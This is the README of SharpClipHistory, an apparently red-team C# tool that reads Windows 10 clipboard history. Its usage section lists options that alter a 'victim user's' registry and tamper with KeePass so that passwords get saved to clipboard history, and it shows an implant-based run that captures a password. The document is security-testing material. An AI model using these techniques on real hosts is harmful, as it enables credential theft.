# SharpClipHistory
SharpClipHistory is a .NET 4.5 application written in C# that can be used to read the contents of a user's clipboard history in Windows 10 starting from the 1809 Build.

# Build Steps
The project must be compiled on a Windows 10 host that supports the clipboard history feature (Build 1809 onwards). 
Building the project should be simple, just clone and hit Build in Visual Studio. However, if there are missing assemblies the following references will have to be added manually:
* C:\Program Files (x86)\Windows Kits\10\References\10.0.17763.0\Windows.Foundation.UniversalApiContract\7.0.0.0\Windows.Foundation.UniversalApiContract.winmd
* C:\Program Files (x86)\Windows Kits\10\References\10.0.17763.0\Windows.Foundation.FoundationContract\3.0.0.0\Windows.Foundation.FoundationContract.winmd

The UWPDesktop package must also be installed to handle other UWP dependencies. 
CommandLineParser and Costura.Fody are also required.

A pre-built executable can also be found [here](https://github.com/mwrlabs/SharpClipHistory/releases).

# Usage
```
C:\Users\User\Desktop>SharpClipHistory.exe --help
SharpClipHistory v1.0
Usage: SharpClipHistory.exe <option>
Options:
    --checkOnly
        Check if the Clipboard history feature is available and enabled on the target host.
    --enableHistory
        Edit the registry to enable clipboard history for the victim user and get contents.
    --saveImages
        Save any images in clipboard to a file in APPDATA.
    --keepassBypass
        Stops KeePass (if it is running) and modifies the config file. Next time KeePass is launched passwords will be saved in clipboard history.
```
# Example
```
beacon> execute-assembly /root/SharpClipHistory.exe
[*] Tasked beacon to run .NET program: SharpClipHistory.exe
[+] host called home, sent: 224299 bytes
[+] received output:

[+] Clipboard history feature is enabled!
[+] Clipboard history Contents:

4/25/2019 2:27:11 PM admin
4/25/2019 2:27:06 PM Sup3rS3cur3Passw0rd123!
```

# Author
This tool was developed by [@pkb1s](https://twitter.com/pkb1s).
